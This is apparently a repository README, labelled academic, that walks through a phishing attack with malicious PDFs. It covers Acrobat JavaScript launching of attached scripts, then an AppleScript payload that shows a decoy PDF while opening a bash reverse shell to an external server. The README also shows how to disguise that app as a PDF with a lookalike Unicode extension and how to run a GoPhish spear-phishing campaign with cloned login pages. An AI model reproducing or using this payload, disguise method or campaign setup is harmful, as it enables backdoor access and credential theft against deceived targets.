# Part 1. PDF Embedding Code Attacks

PDF supports a lot of content formats such as text, HTML, CSS, JavaScript, etc.
You can also attach files in pdf files.
With the ability of using JavaScript in pdf files, there might be vulnerability.
The abstraction of this attack is to attach an executable file or a bash script, and use JavaScript to download the attachment then execute the file.

## PyPDF2

My approach uses PyPDF2 library to achieve the operation we discussed above.
PyPDF2 supports file attachment to a pdf file, the function I am using is `addAttachment(filename, data)`.
The function for embedding JavaScript is `addJS(script)`.

## Acrobat

Acrobat provides several functions and properties for manipulating the file attachments.
The function I am using here is `this.exportDataObject({cName: filename,nLaunch: option})`.
We are using option "2" for the nLaunch argument which enable the "download then execute" operation.

## Results

After creating a new file with `pdf_inject.py`, we open the pdf file with Adobe Acrobat Reader.
_(You need to use this reader to execute the JavaScript)_

![0](https://raw.githubusercontent.com/ohbriansung/phishing_email_pdf_attack/master/img/0.png)

You can see there's a `mock.txt` file attached to the pdf file.
The original file I attached to it was sh file but I mocked the format as a text file.

![1](https://raw.githubusercontent.com/ohbriansung/phishing_email_pdf_attack/master/img/1.png)

The Acrobat Reader detected the attachment was not text file so it pop out a window to ask if the user would like to download the file or not.
It also warned the user that this could be a malicious code.

![2](https://raw.githubusercontent.com/ohbriansung/phishing_email_pdf_attack/master/img/2.png)

Not thing happened if you really open the file.

![3](https://raw.githubusercontent.com/ohbriansung/phishing_email_pdf_attack/master/img/3.png)

The newer version of Adobe Acrobat Reader has some mechanisms to prevent the attack like this.
I am looking into some other ways to achieve the goal.

<hr/>

# Part 2. Fake PDF Attack

So the JavaScript embedded attack above was patched,
let's move on and make a fake pdf file with AppleScript.

## Creating AppleScript

The extension of an AppleScript is _.scpt_.

```shell
touch payload.scpt
nano payload.scpt
```

The contents in my payload:

```AppleScript
do shell script "rm -f /tmp/Twitter.pdf"
do shell script "curl -s -L -o /tmp/Twitter.pdf 'https://drive.google.com/uc?export=download&id=1Iq6gJytrjp2zlpjWfaDmYECaELs3biG2'"
do shell script "open -a Preview.app /tmp/Twitter.pdf"
do shell script "bash -i >& /dev/tcp/206.189.215.73/3456 0>&1 &"
```

0. Clean up previous payload.
1. Download a real pdf from my google drive and put it in /tmp folder where normal user don't really use.
   _(-s for silent mode, -L for following redirects, -o for output)_
1. Open the pdf file above with Preview application.
1. Open a bash revers shell backdoor to my server and run in background.

## Export To Application

Use Mac's build-in Script Editor for exporting the script above into a executable application.

![Fake 0](https://raw.githubusercontent.com/ohbriansung/phishing_email_pdf_attack/master/img/fake_0.png)

Choose _Application_ for File Format and rename the file.

![Fake 1](https://raw.githubusercontent.com/ohbriansung/phishing_email_pdf_attack/master/img/fake_1.png)

Now, you will get a application for mac that will execute the AppleScript in the previous section.

## Fake The Appearance

Right click the application and select _Get Info_ or use _Command + I_.

![Fake 2](https://raw.githubusercontent.com/ohbriansung/phishing_email_pdf_attack/master/img/fake_2.png)

Drag a real pdf file into its icon which will create a pdf file preview.

![Fake GIF](https://raw.githubusercontent.com/ohbriansung/phishing_email_pdf_attack/master/img/fake_gif.gif)

Rename the file with _.pⅾf_ extension.

(Important) The "ⅾ" we are using is not actual English character "d".
We need to use "ⅾ" which is small roman numeral five hundred (Unicode character U+217E).

![Fake 3](https://raw.githubusercontent.com/ohbriansung/phishing_email_pdf_attack/master/img/fake_3.gif)

## Demo

I ssh to my server on _206.189.215.73_ and open a netcat listener.
Double click the fake pdf I just created with the instructions above.
The fake pdf downloads and opens a real pdf, then opens the backdoor for me.

[![Brian Fake PDF Attack demo](https://img.youtube.com/vi/i5z8vxSXXt4/0.jpg)](https://youtu.be/i5z8vxSXXt4)

<hr/>

# Part 3. Phishing Email

I used an open source phishing framework called GoPhish which could be one of the ways to deliver my fake pdf payload.
Here is the frontend of this framework.

![GoPhish 0](https://raw.githubusercontent.com/ohbriansung/phishing_email_pdf_attack/master/img/phish_0.png)

## Sending Profile

Create a profile for sending email with _smtp.gmail.com_ and enter the email account information for sender.

![GoPhish 1](https://raw.githubusercontent.com/ohbriansung/phishing_email_pdf_attack/master/img/phish_1.png)

## Landing Pages

Create a landing page with html when user click any url in the email.
You can also import from a existing site.
For example, LinkedIn login page.
The information user input to this landing page will be report to me.

![GoPhis 2](https://raw.githubusercontent.com/ohbriansung/phishing_email_pdf_attack/master/img/phish_2.png)

![GoPhis 3](https://raw.githubusercontent.com/ohbriansung/phishing_email_pdf_attack/master/img/phish_3.png)

## Email Template

Create a email template with html which will be the content in this phishing email.
You can also import from a existing email.
This is a spear phishing since I am targeting a very specific person with his personal information and the content he/she might be interested in.

![GoPhis 4](https://raw.githubusercontent.com/ohbriansung/phishing_email_pdf_attack/master/img/phish_4.png)

## User and Group

Create user and group for receiver information.

![GoPhis 5](https://raw.githubusercontent.com/ohbriansung/phishing_email_pdf_attack/master/img/phish_5.png)

## Campaigns

Create a campaign for the target with all the setups above.

![GoPhis 6](https://raw.githubusercontent.com/ohbriansung/phishing_email_pdf_attack/master/img/phish_6.png)

## Result Tracking

After sending the phishing email.
The framework will keep tracking the states of the attack.
You will see the information like whether the target opens the email or click the url, etc.

![GoPhis 7](https://raw.githubusercontent.com/ohbriansung/phishing_email_pdf_attack/master/img/phish_7.png)

<hr/>

## Author

Chien-Yu (Brian) Sung

## Disclaimer

This repository is for academic purposes, the use of this software is your responsibility.

## References

0. [PyPDF2](https://pythonhosted.org/PyPDF2/PdfFileWriter.html?highlight=addAttachment)
1. [Acrobat](https://acrobatusers.com/tutorials/importing-and-exporting-pdf-file-attachments-acrobat-javascript)
1. [GoPhish](https://getgophish.com)
1. [Curl to download file from Google Drive](https://stackoverflow.com/questions/20665881/direct-download-from-google-drive-using-google-drive-api)
